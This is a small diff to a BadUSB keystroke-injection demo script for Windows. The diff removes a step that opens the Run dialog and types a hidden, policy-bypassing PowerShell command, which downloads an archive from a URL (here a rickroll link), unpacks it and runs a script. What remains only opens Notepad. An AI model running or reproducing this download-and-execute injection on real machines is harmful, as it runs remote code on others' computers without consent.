@@ -1,11 +1,5 @@
 REM This is BadUSB demo script for windows
 
-DELAY 2000
-GUI r
-DELAY 500
-STRING powershell -w h -NoP -NonI -Ep Bypass $D="$env:tmp";irm -Uri 'https://www.youtube.com/watch?v=dQw4w9WgXcQ' -O "$D\rr.zip";Expand-Archive "$D\rr.zip" -Des $D\rr -Force;. "$D\rr\rr.ps1"
-ENTER
-
 REM Open windows notepad
 DELAY 1000
 GUI r
